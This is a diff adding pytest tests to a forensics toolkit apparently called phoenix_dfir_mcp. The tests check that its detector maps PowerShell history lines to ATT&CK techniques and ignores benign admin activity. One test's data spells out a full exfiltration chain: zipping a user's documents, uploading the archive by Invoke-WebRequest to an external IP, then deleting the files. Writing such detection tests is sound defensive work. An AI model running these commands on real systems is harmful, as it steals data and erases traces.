@@ -4,6 +4,8 @@
 
 import os
 
+import pytest
+
 from phoenix_dfir_mcp import logdetect, sigma_engine, toolkit, triage
 
 SUITE = os.path.join(os.path.dirname(__file__), '..', '..', 'eval', 'suite')
@@ -64,3 +66,38 @@ def test_windows_text_lines_keep_the_full_command_line():
     [encoded] = [e for e in logdetect.windows_events(events) if e['line'] == 2]
     assert encoded['data']['CommandLine'].endswith('IABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA')
     assert encoded['event_id'] == 4688 and encoded['channel'] == 'Security'
+
+
+DISK_CASE = os.path.join(SUITE, 'disk_image_data_exfiltration')
+ADMIN_HISTORY = os.path.join(SUITE, 'benign_admin_history', 'ConsoleHost_history.txt')
+
+
+def _history_events(lines):
+    return [{'line': n, 'event': text, 'data': {'raw': text}} for n, text in enumerate(lines, 1)]
+
+
+def test_archive_uploaded_then_deleted_is_an_exfiltration_chain():
+    lines = ['Get-ChildItem C:\\Users\\jdoe\\Documents\\Projet_Orion',
+             'Compress-Archive -Path C:\\Users\\jdoe\\Documents\\Projet_Orion -DestinationPath C:\\Users\\Public\\maj_q3.zip',
+             'Invoke-WebRequest -Uri http://45.137.21.9:8080/upload -Method Put -InFile C:\\Users\\Public\\maj_q3.zip',
+             'Remove-Item C:\\Users\\Public\\maj_q3.zip',
+             'Remove-Item C:\\Users\\jdoe\\Documents\\Projet_Orion\\plan_strategique_2027.docx']
+    alerts = logdetect.history_alerts(_history_events(lines))
+    assert sorted((a['technique'], a['line']) for a in alerts) == [
+        ('T1048.003', 3), ('T1070.004', 4), ('T1070.004', 5), ('T1560.001', 2)]
+    upload = next(a for a in alerts if a['technique'] == 'T1048.003')
+    assert upload['dst'] == '45.137.21.9' and upload['file'] == 'C:\\Users\\Public\\maj_q3.zip'
+
+
+def test_internal_archive_copy_and_cleanup_is_not_exfiltration():
+    with open(ADMIN_HISTORY, encoding='utf-8') as f:
+        lines = f.read().splitlines()
+    assert logdetect.history_alerts(_history_events(lines)) == []
+
+
+def test_triage_disk_case_finds_the_chain_when_tsk_is_installed():
+    from phoenix_dfir_mcp import disk
+    if not disk.tsk_available():
+        pytest.skip('The Sleuth Kit (mmls, fls, icat) is not installed')
+    techniques = set(triage.run_triage(DISK_CASE)['summary']['techniques'])
+    assert {'T1560.001', 'T1070.004'} <= techniques
